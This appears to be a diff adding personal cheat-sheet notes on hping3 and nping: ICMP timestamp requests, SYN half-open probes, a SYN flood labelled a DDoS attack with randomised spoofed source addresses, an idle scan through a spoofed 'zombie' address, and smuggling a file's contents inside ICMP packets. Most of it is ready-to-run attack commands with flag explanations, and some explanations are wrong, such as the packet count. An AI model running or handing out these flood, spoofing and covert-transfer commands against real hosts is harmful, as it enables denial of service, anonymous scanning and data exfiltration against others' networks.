@@ -1,0 +1,48 @@
+
+
+=======================================================
+
+hping3 and some nping
+
+======================================================
+
+Contains more ping tools 
+
+to receive ICMP timestamp type 13/14 requests and replays use
+
+$ sudo hping3 192.168.1.168 --icmp --icmp-ts -V
+ 
+you can also use nping 
+
+$ sudo nping -icmp -icmp-type 13 timestamp-request 127.0.0.1
+
+Performing a half open
+
+$ sudo hping3 127.0.0.1 --syn
+
+DDOs attack 
+
+$ sudo hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.168
+
+	-c count 1000 packets
+	-d data size 120
+	-S Syn packet (half open))
+	-w window size ( dont check acknowledgement untill window size 64)
+	-p port 80
+	--flood 
+	--rand-source  spoofing ip addresses
+
+Idle scanning 
+
+	keep your ip annonymous using a zombie ip 
+
+$ sudo hping3 -Q -1 -a 25.32.32.13 192.168.1.168
+
+Send files in packets 
+
+$ sudo hping3 -1 -E nixondots.txt -d 500 192.168.1.168
+
+	-E for files transfer
+	-d for data size
+
+
